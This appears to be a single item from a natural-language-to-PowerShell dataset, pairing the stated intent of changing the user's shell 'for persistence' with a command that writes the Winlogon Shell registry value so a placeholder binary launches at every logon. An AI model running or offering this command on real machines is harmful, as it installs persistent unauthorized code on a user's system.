# Natural language intent:
# Modify the Windows Registry to change the user's shell, possibly for persistence.

Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, ${binary}" -Force
